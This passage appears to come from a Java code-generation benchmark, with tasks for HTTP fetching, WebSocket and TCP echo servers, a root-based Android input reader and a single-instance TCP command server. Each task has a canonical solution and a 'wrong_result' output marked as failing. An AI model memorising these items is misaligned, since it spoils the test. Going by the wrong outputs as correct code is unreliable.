    "Canonical_solution": "import java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\n\nprivate InputStream getKmlContents(String urlStr) {\n    InputStream inputStream;\n    try {\n        if (urlStr.startsWith(\"http://\") || urlStr.startsWith(\"https://\")) {\n            URL url = new URL(urlStr);\n            boolean redirect = true;\n            HttpURLConnection http = null;\n            String cookies = null;\n            int redirectCnt = 0;\n            while(redirect && redirectCnt < 10) {\n                redirect = false;\n                http = (HttpURLConnection)url.openConnection();\n                http.setRequestMethod(\"GET\");\n                if (cookies != null) {\n                    http.setRequestProperty(\"Cookie\", cookies);\n                }\n                http.addRequestProperty(\"Accept-Language\", \"en-US,en;q=0.8\");\n                http.addRequestProperty(\"User-Agent\", \"Mozilla\");\n                http.setInstanceFollowRedirects(true);\n                HttpURLConnection.setFollowRedirects(true);\n\n                int status = http.getResponseCode();\n                if (status != HttpURLConnection.HTTP_OK) {\n                    if (status == HttpURLConnection.HTTP_MOVED_TEMP\n                        || status == HttpURLConnection.HTTP_MOVED_PERM\n                        || status == HttpURLConnection.HTTP_SEE_OTHER)\n                        redirect = true;\n                }\n                if (redirect) {\n                    url = new URL(http.getHeaderField(\"Location\"));\n                    cookies = http.getHeaderField(\"Set-Cookie\");\n                    http.disconnect();\n                    redirectCnt++;\n                }\n            }\n            inputStream = http.getInputStream();\n        } else {\n            // Handle other URL types (file://, etc)\n            return null;\n        }\n    } catch (Exception e) {\n        e.printStackTrace();\n        return null;\n    }\n    return inputStream;\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 16,
    "wrong_result": "```java\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.net.HttpURLConnection;\nimport java.net.URL;\nimport java.util.HashMap;\nimport java.util.Map;\n\npublic class HttpFetcher {\n    private static final int MAX_REDIRECTS = 10;\n\n    public InputStream fetchContent(String urlStr) {\n        if (!urlStr.startsWith(\"http://\") && !urlStr.startsWith(\"https://\")) {\n            return null;\n        }\n\n        HttpURLConnection conn = null;\n        try {\n            URL url = new URL(urlStr);\n            Map<String, String> headers = new HashMap<>();\n            headers.put(\"User-Agent\", \"Mozilla/5.0\");\n            headers.put(\"Accept-Language\", \"en-US,en;q=0.5\");\n\n            return followRedirects(url, headers, 0);\n        } catch (IOException e) {\n            return null;\n        }\n    }\n\n    private InputStream followRedirects(URL url, Map<String, String> headers, int redirectCount) throws IOException {\n        if (redirectCount > MAX_REDIRECTS) {\n            return null;\n        }\n\n        HttpURLConnection conn = (HttpURLConnection) url.openConnection();\n        conn.setInstanceFollowRedirects(false);\n\n        for (Map.Entry<String, String> entry : headers.entrySet()) {\n            conn.setRequestProperty(entry.getKey(), entry.getValue());\n        }\n\n        if (conn instanceof HttpURLConnection) {\n            String cookieHeader = conn.getHeaderField(\"Set-Cookie\");\n            if (cookieHeader != null) {\n                headers.put(\"Cookie\", cookieHeader.split(\";\")[0]);\n            }\n        }\n\n        int responseCode = conn.getResponseCode();\n        if (responseCode == HttpURLConnection.HTTP_MOVED_PERM || responseCode == HttpURLConnection.HTTP_MOVED_TEMP ||\n            responseCode == HttpURLConnection.HTTP_SEE_OTHER) {\n            String location = conn.getHeaderField(\"Location\");\n            if (location == null) {\n                return conn.getInputStream();\n            }\n            URL newUrl = new URL(url, location);\n            return followRedirects(newUrl, headers, redirectCount + 1);\n        } else if (responseCode >= 200 && responseCode < 300) {\n            return conn.getInputStream();\n        } else {\n            return null;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 530,
    "Instruction": "Task Description: Implement a WebSocket server class in Java that handles WebSocket connections, performs the WebSocket handshake protocol, and manages client connections.\n\nClass Description: The WebSocketServer class represents a TCP server that implements the WebSocket protocol. It listens for incoming connections, handles the WebSocket handshake, and manages client connections. The server runs in a separate thread to avoid blocking the main thread.\n\nAttributes:\n- serverSocket: ServerSocket - The server socket that listens for incoming connections\n- port: int - The port number on which the server listens\n- serverThread: Thread - The thread in which the server runs\n\nMethods:\n- WebSocketServer(int port) -> None - Constructor that initializes the server with the specified port\n- start() -> None - Starts the server in a new thread and begins listening for connections\n- stop() -> None - Stops the server and releases all resources\n- handleClientConnection(Socket client) -> None - Handles the WebSocket handshake protocol for a connected client\n- generateFinalKey(String in) -> String - Generates the Sec-WebSocket-Accept key for the WebSocket handshake response",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.io.IOException;\nimport java.io.OutputStream;\nimport java.util.Scanner;\n\npublic class WebSocketServer {\n\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        serverThread = new Thread(() -> {\n            try {\n                serverSocket = new ServerSocket(port);\n                serverSocket.setReuseAddress(true);\n                while (true) {\n                    Socket client = null;\n                    try {\n                        client = serverSocket.accept();\n                        handleClientConnection(client);\n                    } catch (IOException e) {\n                        // Handle client connection error\n                    }\n                }\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n    }\n\n    private void handleClientConnection(Socket client) throws IOException {\n        Scanner in = new Scanner(client.getInputStream());\n        OutputStream os = client.getOutputStream();\n        \n        // Read client handshake\n        String input = in.nextLine();\n        String testCase = input.split(\" \")[1];\n        String seckey = \"\";\n        while (in.hasNext()) {\n            input = in.nextLine();\n            if (input.startsWith(\"Sec-WebSocket-Key: \")) {\n                seckey = input.split(\" \")[1];\n            }\n            if (input.startsWith(\"Upgrade\")) {\n                break;\n            }\n        }\n\n        // Send response based on test case\n        String response = \"HTTP/1.1 101 Websocket Connection Upgrade\\r\\n\" +\n                         \"Upgrade: websocket\\r\\n\" +\n                         \"Connection: Upgrade\\r\\n\" +\n                         \"Sec-WebSocket-Accept: \" + generateFinalKey(seckey) + \"\\r\\n\\r\\n\";\n        os.write(response.getBytes());\n        os.flush();\n    }\n\n    public void stop() throws IOException {\n        if (serverSocket != null) {\n            serverSocket.close();\n        }\n        if (serverThread != null) {\n            serverThread.interrupt();\n        }\n    }\n\n    private String generateFinalKey(String in) {\n        String seckey = in.trim();\n        String acc = seckey + \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n        try {\n            java.security.MessageDigest sh1 = java.security.MessageDigest.getInstance(\"SHA1\");\n            return org.java_websocket.util.Base64.encodeBytes(sh1.digest(acc.getBytes()));\n        } catch (java.security.NoSuchAlgorithmException e) {\n            throw new IllegalStateException(e);\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\nimport java.security.MessageDigest;\nimport java.security.NoSuchAlgorithmException;\nimport java.util.Base64;\n\npublic class WebSocketServer implements Runnable {\n    private ServerSocket serverSocket;\n    private int port;\n    private Thread serverThread;\n\n    public WebSocketServer(int port) {\n        this.port = port;\n    }\n\n    public void start() {\n        try {\n            serverSocket = new ServerSocket(port);\n            serverThread = new Thread(this);\n            serverThread.start();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void stop() {\n        try {\n            if (serverSocket != null && !serverSocket.isClosed()) {\n                serverSocket.close();\n            }\n            if (serverThread != null) {\n                serverThread.interrupt();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    public void run() {\n        try {\n            while (!Thread.currentThread().isInterrupted()) {\n                Socket client = serverSocket.accept();\n                handleClientConnection(client);\n            }\n        } catch (IOException e) {\n            if (!serverSocket.isClosed()) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private void handleClientConnection(Socket client) {\n        try (BufferedReader in = new BufferedReader(new InputStreamReader(client.getInputStream()));\n             BufferedWriter out = new BufferedWriter(new OutputStreamWriter(client.getOutputStream()))) {\n\n            StringBuilder request = new StringBuilder();\n            String line;\n            while (!(line = in.readLine()).isEmpty()) {\n                request.append(line).append(\"\\r\\n\");\n            }\n\n            String secWebSocketKey = extractSecWebSocketKey(request.toString());\n            String finalKey = generateFinalKey(secWebSocketKey);\n\n            String response = \"HTTP/1.1 101 Switching Protocols\\r\\n\"\n                    + \"Upgrade: websocket\\r\\n\"\n                    + \"Connection: Upgrade\\r\\n\"\n                    + \"Sec-WebSocket-Accept: \" + finalKey + \"\\r\\n\\r\\n\";\n\n            out.write(response);\n            out.flush();\n\n            // TODO: Implement further WebSocket communication handling\n\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private String extractSecWebSocketKey(String request) {\n        String[] lines = request.split(\"\\r\\n\");\n        for (String line : lines) {\n            if (line.startsWith(\"Sec-WebSocket-Key:\")) {\n                return line.substring(\"Sec-WebSocket-Key:\".length()).trim();\n            }\n        }\n        return \"\";\n    }\n\n    private String generateFinalKey(String in) {\n        try {\n            String magic = \"258EAFA5-E914-47DA-95CA-C5AB0DC85B11\";\n            MessageDigest sha1 = MessageDigest.getInstance(\"SHA-1\");\n            byte[] hash = sha1.digest((in + magic).getBytes(\"UTF-8\"));\n            return Base64.getEncoder().encodeToString(hash);\n        } catch (NoSuchAlgorithmException | UnsupportedEncodingException e) {\n            e.printStackTrace();\n            return \"\";\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 535,
    "Instruction": "Task Description: Implement an Android input capture provider that uses TCP socket communication to interface with a native evdev reader process for handling input events from rooted devices.\n\nClass Description: EvdevCaptureProvider is an Android input capture implementation that establishes a TCP server to communicate with a native evdev reader process running with root privileges. It handles input event capture and forwarding while managing the lifecycle of the socket connection and root process.\n\nAttributes:\n- listener: [EvdevListener] - Callback interface for handling input events\n- libraryPath: [String] - Path to the native library directory\n- shutdown: [boolean] - Flag indicating whether the provider should terminate\n- evdevIn: [InputStream] - Input stream from the evdev reader socket\n- evdevOut: [OutputStream] - Output stream to the evdev reader socket\n- su: [Process] - Root process running the evdev reader\n- servSock: [ServerSocket] - TCP server socket for accepting connections\n- evdevSock: [Socket] - Socket connection to the evdev reader\n- activity: [Activity] - Android activity context\n- started: [boolean] - Flag indicating if the provider has started\n- handlerThread: [Thread] - Thread handling the socket communication\n\nMethods:\n- EvdevCaptureProvider([Activity activity, EvdevListener listener]) -> [void] - Constructor that initializes the capture provider with activity context and event listener\n- destroy() -> [void] - Cleans up resources including sockets, streams, and terminates the root process\n- reportDeviceNotRooted() -> [void] - Displays a toast message when the device isn't rooted (private helper method)\n- run() -> [void] - Thread implementation that establishes the server socket, launches the root process, and handles event reading (inner Thread class method)",
    "Canonical_solution": "import android.app.Activity;\nimport android.os.Build;\nimport android.os.Looper;\nimport android.widget.Toast;\n\nimport com.limelight.LimeLog;\nimport com.limelight.binding.input.capture.InputCaptureProvider;\n\nimport java.io.DataOutputStream;\nimport java.io.File;\nimport java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EvdevCaptureProvider extends InputCaptureProvider {\n\n    private final EvdevListener listener;\n    private final String libraryPath;\n\n    private boolean shutdown = false;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started = false;\n\n    private static final byte UNGRAB_REQUEST = 1;\n    private static final byte REGRAB_REQUEST = 2;\n\n    private final Thread handlerThread = new Thread() {\n        @Override\n        public void run() {\n            try {\n                servSock = new ServerSocket(0, 1);\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n\n            final String evdevReaderCmd = libraryPath+File.separatorChar+\"libevdev_reader.so \"+servSock.getLocalPort();\n\n            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {\n                try {\n                    su = new ProcessBuilder(\"su\", \"-c\", evdevReaderCmd).start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n            else {\n                ProcessBuilder builder = new ProcessBuilder(\"su\");\n                builder.redirectErrorStream(true);\n\n                try {\n                    su = builder.start();\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n\n                DataOutputStream suOut = new DataOutputStream(su.getOutputStream());\n                try {\n                    suOut.writeChars(evdevReaderCmd+\"\\n\");\n                } catch (IOException e) {\n                    reportDeviceNotRooted();\n                    e.printStackTrace();\n                    return;\n                }\n            }\n\n            LimeLog.info(\"Waiting for EvdevReader connection to port \"+servSock.getLocalPort());\n            try {\n                evdevSock = servSock.accept();\n                evdevIn = evdevSock.getInputStream();\n                evdevOut = evdevSock.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n                return;\n            }\n            LimeLog.info(\"EvdevReader connected from port \"+evdevSock.getPort());\n\n            while (!isInterrupted() && !shutdown) {\n                EvdevEvent event;\n                try {\n                    event = EvdevReader.read(evdevIn);\n                } catch (IOException e) {\n                    event = null;\n                }\n                if (event == null) {\n                    break;\n                }\n            }\n        }\n    };\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.listener = listener;\n        this.activity = activity;\n        this.libraryPath = activity.getApplicationInfo().nativeLibraryDir;\n    }\n\n    private void reportDeviceNotRooted() {\n        activity.runOnUiThread(new Runnable() {\n            @Override\n            public void run() {\n                Toast.makeText(activity, \"This device is not rooted - Mouse capture is unavailable\", Toast.LENGTH_LONG).show();\n            }\n        });\n    }\n\n    @Override\n    public void destroy() {\n        if (!started) {\n            return;\n        }\n\n        shutdown = true;\n        handlerThread.interrupt();\n\n        if (servSock != null) {\n            try {\n                servSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevSock != null) {\n            try {\n                evdevSock.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevIn != null) {\n            try {\n                evdevIn.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (evdevOut != null) {\n            try {\n                evdevOut.close();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        if (su != null) {\n            su.destroy();\n        }\n\n        try {\n            handlerThread.join();\n        } catch (InterruptedException ignored) {}\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\npublic class EvdevCaptureProvider {\n    private EvdevListener listener;\n    private String libraryPath;\n    private boolean shutdown;\n    private InputStream evdevIn;\n    private OutputStream evdevOut;\n    private Process su;\n    private ServerSocket servSock;\n    private Socket evdevSock;\n    private Activity activity;\n    private boolean started;\n    private Thread handlerThread;\n\n    public EvdevCaptureProvider(Activity activity, EvdevListener listener) {\n        this.listener = listener;\n        this.activity = activity;\n        this.libraryPath = \"/system/lib\";\n        this.shutdown = false;\n        this.started = false;\n        this.handlerThread = new Thread(this::run);\n    }\n\n    public void destroy() {\n        shutdown = true;\n        try {\n            if (evdevIn != null) {\n                evdevIn.close();\n            }\n            if (evdevOut != null) {\n                evdevOut.close();\n            }\n            if (evdevSock != null) {\n                evdevSock.close();\n            }\n            if (servSock != null) {\n                servSock.close();\n            }\n            if (su != null) {\n                su.destroy();\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        }\n        started = false;\n    }\n\n    private void reportDeviceNotRooted() {\n        Toast.makeText(activity, \"Device is not rooted\", Toast.LENGTH_LONG).show();\n    }\n\n    private void run() {\n        try {\n            int port = 12345;\n            servSock = new ServerSocket(port);\n            String command = \"LD_LIBRARY_PATH=\" + libraryPath + \" /data/local/evdev_reader \" + port;\n            su = Runtime.getRuntime().exec(\"su\");\n            DataOutputStream os = new DataOutputStream(su.getOutputStream());\n            os.writeBytes(command + \"\\n\");\n            os.flush();\n\n            evdevSock = servSock.accept();\n            evdevIn = evdevSock.getInputStream();\n            evdevOut = evdevSock.getOutputStream();\n\n            byte[] buffer = new byte[1024];\n            int bytesRead;\n            while (!shutdown) {\n                try {\n                    bytesRead = evdevIn.read(buffer);\n                    if (bytesRead > 0) {\n                        listener.onInputEventReceived(buffer, bytesRead);\n                    }\n                } catch (IOException e) {\n                    break;\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            reportDeviceNotRooted();\n        } finally {\n            destroy();\n        }\n    }\n\n    public void start() {\n        if (!started) {\n            handlerThread.start();\n            started = true;\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 536,
    "Instruction": "Task Description: Demonstrate basic TCP socket communication between a server and client using Java's ServerSocket and Socket classes. The server should echo back any data received from the client.\n\nFunction Description: The function establishes a TCP server that listens on port 5678, accepts a client connection, reads data from the client, writes the same data back (echo), and then closes the connection. Simultaneously, it creates a client that connects to this server, sends a test message, and verifies the echoed response.\n\nInput: None (The function uses hardcoded values for demonstration purposes)\n\nOutput: None (The function performs communication internally and handles errors through fail() calls)\n\n---\n\nNote: Since the reference code shows a complete test scenario (both server and client) implemented as a single function with internal threading rather than separate reusable components, I've described it at the function level. If you'd prefer this to be split into proper class definitions for Server and Client components, please let me know and I can provide that alternative structure instead.",
    "Canonical_solution": "import java.net.ServerSocket;\nimport java.net.Socket;\nimport java.net.InetSocketAddress;\nimport java.io.InputStream;\nimport java.io.OutputStream;\n\npublic void testServerSocketCommunication() {\n    Thread listener = new Thread(new Runnable() {\n        @Override\n        public void run() {\n            ServerSocket s = null;\n            try {\n                s = new ServerSocket(5678);\n            } catch (IOException e) {\n                fail(\"exception creating ServerSocket\");\n            }\n\n            byte[] recv = new byte[800];\n\n            Socket peer = null;\n            try {\n                peer = s.accept();\n            } catch (IOException e) {\n                fail(\"accept failed\");\n            }\n\n            InputStream is = peer.getInputStream();\n            OutputStream os = peer.getOutputStream();\n\n            int recvLen = 0;\n            try {\n                recvLen = is.read(recv);\n            } catch (IOException e) {\n                fail(\"read failed\");\n            }\n\n            try {\n                os.write(recv, 0, recvLen);\n            } catch (IOException e) {\n                fail(\"write failed\");\n            }\n\n            try {\n                peer.close();\n                s.close();\n            } catch (IOException e) {\n                fail(\"close failed\");\n            }\n        }\n    });\n    listener.start();\n\n    Socket s = null;\n    try {\n        s = new Socket();\n        s.bind(new InetSocketAddress(\"192.168.0.3\", 0));\n    } catch (IOException e) {\n        fail(\"new socket failed\");\n    }\n\n    try {\n        s.connect(new InetSocketAddress(\"192.168.0.3\", 5678));\n    } catch (IOException e) {\n        fail(\"connect failed\");\n    }\n\n    byte[] send = \"Hello, World!\".getBytes();\n    InputStream is = s.getInputStream();\n    OutputStream os = s.getOutputStream();\n\n    try {\n        os.write(send);\n    } catch (IOException e) {\n        fail(\"exception sending on Socket\");\n    }\n\n    byte[] recv = new byte[800];\n    int recvLen = 0;\n    try {\n        recvLen = is.read(recv);\n    } catch (IOException e) {\n        fail(\"exception receiving on DatagramSocket\");\n    }\n\n    try {\n        listener.join();\n    } catch (InterruptedException e) {\n    }\n\n    try {\n        s.close();\n    } catch (IOException e) {\n        fail(\"close failed\");\n    }\n}",
    "Code_level": "Function-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TCPEchoTest {\n    public static void main(String[] args) throws IOException {\n        Thread serverThread = new Thread(() -> {\n            try (ServerSocket serverSocket = new ServerSocket(5678)) {\n                try (Socket clientSocket = serverSocket.accept()) {\n                    BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                    BufferedWriter out = new BufferedWriter(new OutputStreamWriter(clientSocket.getOutputStream()));\n                    String inputLine;\n                    while ((inputLine = in.readLine()) != null) {\n                        out.write(inputLine);\n                        out.newLine();\n                        out.flush();\n                    }\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        });\n        serverThread.start();\n\n        try (Socket socket = new Socket(\"localhost\", 5678)) {\n            BufferedWriter out = new BufferedWriter(new OutputStreamWriter(socket.getOutputStream()));\n            BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()));\n\n            String testMessage = \"Hello, Echo Server!\";\n            out.write(testMessage);\n            out.newLine();\n            out.flush();\n\n            String response = in.readLine();\n            if (!testMessage.equals(response)) {\n                System.err.println(\"Echo failed. Expected: \" + testMessage + \", but got: \" + response);\n                System.exit(1);\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n            System.exit(1);\n        }\n\n        serverThread.interrupt();\n    }\n}\n```"
  },
  {
    "Task_id": 541,
    "Instruction": "Task Description: Implement a TCP server in Java that handles multiple client connections concurrently using blocking I/O. The server should echo back any data received from clients after sending an initial welcome message.\n\nClass Description: EchoBioServer is a TCP server implementation that listens for incoming client connections on a specified port. For each connection, it creates a new thread to handle communication, sending a welcome message initially and then echoing back all received data.\n\nAttributes:\n- FIRST_BYTES: byte[] - The welcome message to be sent to clients upon connection\n- serverSocket: ServerSocket - The server socket listening for incoming connections\n\nMethods:\n- EchoBioServer(int port) -> void - Constructor that initializes the server socket on the specified port\n- run() -> void - Main server loop that accepts incoming connections and spawns new threads for each client\n- BioConnection(Socket socket) -> void - Nested class constructor that handles individual client connections\n- run() -> void - (In BioConnection) Handles the communication with a single client, echoing received data\n\nNested Class: BioConnection\nAttributes:\n- socket: Socket - The client socket connection\n- input: InputStream - Input stream for reading client data\n- output: OutputStream - Output stream for writing to client\n- readBuffer: byte[] - Buffer for storing received data\n- writeBuffer: byte[] - Buffer for storing data to send\n\nMethods:\n- BioConnection(Socket socket) -> void - Constructor that initializes I/O streams and buffers for a client connection\n- run() -> void - Handles the client communication loop (send welcome message, echo received data)",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.ServerSocket;\nimport java.net.Socket;\n\npublic class EchoBioServer implements Runnable {\n\n    private static final byte[] FIRST_BYTES = \"Welcome to Cobar Server.\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        serverSocket = new ServerSocket(port);\n    }\n\n    @Override\n    public void run() {\n        while (true) {\n            try {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private byte[] readBuffer;\n        private byte[] writeBuffer;\n\n        private BioConnection(Socket socket) throws IOException {\n            this.socket = socket;\n            this.input = socket.getInputStream();\n            this.output = socket.getOutputStream();\n            this.readBuffer = new byte[4096];\n            this.writeBuffer = new byte[4096];\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                output.flush();\n                while (true) {\n                    int got = input.read(readBuffer);\n                    output.write(writeBuffer, 0, got);\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n                if (socket != null) {\n                    try {\n                        socket.close();\n                    } catch (IOException e1) {\n                        e1.printStackTrace();\n                    }\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\npublic class EchoBioServer {\n    private final byte[] FIRST_BYTES = \"Welcome to the Echo Server!\\n\".getBytes();\n    private final ServerSocket serverSocket;\n\n    public EchoBioServer(int port) throws IOException {\n        this.serverSocket = new ServerSocket(port);\n    }\n\n    public void run() {\n        try {\n            while (true) {\n                Socket socket = serverSocket.accept();\n                new Thread(new BioConnection(socket)).start();\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n\n    private class BioConnection implements Runnable {\n        private final Socket socket;\n        private InputStream input;\n        private OutputStream output;\n        private final byte[] readBuffer = new byte[1024];\n        private final byte[] writeBuffer = new byte[1024];\n\n        public BioConnection(Socket socket) {\n            this.socket = socket;\n            try {\n                input = socket.getInputStream();\n                output = socket.getOutputStream();\n            } catch (IOException e) {\n                e.printStackTrace();\n            }\n        }\n\n        @Override\n        public void run() {\n            try {\n                output.write(FIRST_BYTES);\n                int bytesRead;\n                while ((bytesRead = input.read(readBuffer)) != -1) {\n                    output.write(readBuffer, 0, bytesRead);\n                    output.flush();\n                }\n            } catch (IOException e) {\n                e.printStackTrace();\n            } finally {\n                try {\n                    socket.close();\n                } catch (IOException e) {\n                    e.printStackTrace();\n                }\n            }\n        }\n    }\n\n    public static void main(String[] args) {\n        try {\n            EchoBioServer server = new EchoBioServer(8080);\n            server.run();\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 542,
    "Instruction": "Task Description: Implement a TCP server class in Java that handles incoming client connections, processes commands, and interacts with a GUI frame. The server should support checking for existing instances, activating windows, and processing file operations.\n\nClass Description: TcpServer is a Thread subclass that creates a TCP server listening on a specified port. It communicates with clients to perform actions like getting window titles, activating windows, and opening files in the associated GUI frame.\n\nAttributes:\n- frame: IAppFrame - Reference to the application's GUI frame for window operations\n- port: int - The port number on which the server listens\n- file: String - File path to be processed (optional)\n\nMethods:\n- TcpServer(int port, IAppFrame frame) -> None - Constructor initializing server with port and frame reference\n- TcpServer(int port, IAppFrame frame, String file) -> None - Constructor with additional file parameter\n- checkExistInstance(int port) -> boolean - Static method checking if another instance is running on given port\n- ask(String host, String cmd, int port) -> boolean - Private static helper method for sending commands to existing instances\n- run() -> None - Main server thread method that listens for connections and processes client requests",
    "Canonical_solution": "import java.io.IOException;\nimport java.io.InputStream;\nimport java.io.OutputStream;\nimport java.net.InetAddress;\nimport java.net.InetSocketAddress;\nimport java.net.ServerSocket;\nimport java.net.Socket;\nimport javax.swing.JFrame;\nimport javax.swing.SwingUtilities;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public static String GETWINDOWTITLE = \"GetWindowTitle\";\n    public static String ACTIVATE = \"ACTIVATE\";\n    public static String LOCALHOST = \"127.0.0.1\";\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this(port, frame);\n        this.file = file;\n    }\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        return ask(LOCALHOST, GETWINDOWTITLE, port);\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        Socket s = new Socket();\n        try {\n            InetSocketAddress isa = new InetSocketAddress(host, port);\n            s.connect(isa, 2000);\n            OutputStream os = s.getOutputStream();\n            os.write(cmd.getBytes());\n            InputStream is = s.getInputStream();\n            byte[] buffer = new byte[1024];\n            int len = is.read(buffer);\n            String res = new String(buffer, 0, len);\n            return res != null && !res.isEmpty();\n        } catch (Exception x) {\n            return false;\n        } finally {\n            try {\n                s.close();\n            } catch (IOException e) {\n            }\n        }\n    }\n\n    public void run() {\n        ServerSocket ss = null;\n        try {\n            ss = new ServerSocket(port, 10, InetAddress.getByName(LOCALHOST));\n            while (true) {\n                Socket s = ss.accept();\n                try {\n                    InputStream is = s.getInputStream();\n                    byte[] buffer = new byte[1024];\n                    int len = is.read(buffer);\n                    String file = new String(buffer, 0, len);\n                    \n                    if (file.equals(GETWINDOWTITLE)) {\n                        OutputStream os = s.getOutputStream();\n                        String wTitle = ((JFrame) frame).getTitle();\n                        os.write(wTitle.getBytes());\n                    } else if (file.equals(ACTIVATE)) {\n                        ((JFrame) frame).toFront();\n                    } else {\n                        if (file.startsWith(\"\\\"\")) {\n                            file = file.substring(1, file.length() - 1);\n                        }\n                        final String sfile = file;\n                        SwingUtilities.invokeLater(() -> {\n                            try {\n                                frame.openSheetFile(sfile);\n                            } catch (Exception e) {\n                                e.printStackTrace();\n                            }\n                        });\n                    }\n                } finally {\n                    s.close();\n                }\n            }\n        } catch (Exception e) {\n            e.printStackTrace();\n        } finally {\n            if (ss != null) {\n                try {\n                    ss.close();\n                } catch (IOException e) {\n                }\n            }\n        }\n    }\n}",
    "Code_level": "Class-level",
    "FSMID_for_test": 0,
    "wrong_result": "```java\nimport java.io.*;\nimport java.net.*;\n\npublic class TcpServer extends Thread {\n    private IAppFrame frame;\n    private int port;\n    private String file;\n\n    public TcpServer(int port, IAppFrame frame) {\n        this.port = port;\n        this.frame = frame;\n    }\n\n    public TcpServer(int port, IAppFrame frame, String file) {\n        this(port, frame);\n        this.file = file;\n    }\n\n    public static boolean checkExistInstance(int port) {\n        try (Socket socket = new Socket()) {\n            socket.connect(new InetSocketAddress(\"localhost\", port), 1000);\n            return true;\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    private static boolean ask(String host, String cmd, int port) {\n        try (Socket socket = new Socket(host, port);\n             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);\n             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {\n            out.println(cmd);\n            String response = in.readLine();\n            return \"OK\".equals(response);\n        } catch (IOException e) {\n            return false;\n        }\n    }\n\n    @Override\n    public void run() {\n        try (ServerSocket serverSocket = new ServerSocket(port)) {\n            while (true) {\n                try (Socket clientSocket = serverSocket.accept();\n                     BufferedReader in = new BufferedReader(new InputStreamReader(clientSocket.getInputStream()));\n                     PrintWriter out = new PrintWriter(clientSocket.getOutputStream(), true)) {\n                    String command = in.readLine();\n                    if (\"GET_WINDOW_TITLE\".equals(command)) {\n                        out.println(frame.getTitle());\n                    } else if (\"ACTIVATE_WINDOW\".equals(command)) {\n                        frame.toFront();\n                        out.println(\"OK\");\n                    } else if (\"OPEN_FILE\".equals(command)) {\n                        String filePath = in.readLine();\n                        frame.openFile(filePath);\n                        out.println(\"OK\");\n                    } else {\n                        out.println(\"UNKNOWN_COMMAND\");\n                    }\n                }\n            }\n        } catch (IOException e) {\n            e.printStackTrace();\n        }\n    }\n}\n```"
  },
  {
    "Task_id": 549,
